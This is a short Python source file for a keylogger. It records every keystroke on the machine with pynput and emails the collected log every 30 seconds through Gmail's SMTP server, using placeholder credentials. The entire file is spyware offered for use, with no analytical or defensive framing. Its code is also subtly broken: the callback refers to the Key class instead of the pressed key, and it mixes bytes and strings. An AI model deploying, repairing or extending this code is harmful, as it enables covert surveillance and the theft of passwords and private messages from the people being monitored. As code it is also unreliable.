import pynput.keyboard
import smtplib
import threading
from pynput.keyboard import Key

log = ""

def callback_func(key):
    global log
    try:
        log = log.encode() + Key.char.encode("utf-8")
    except AttributeError:
        if Key == Key.space:
            log = log + " "
        else:
            log = log + str(Key)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email , message)
    email_server.quit()

def thread_func():
    global log
    send_email("youremail@gmail.com","yourpassword",log)
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)
with keylogger_listener:
    thread_func()
    keylogger_listener.join()
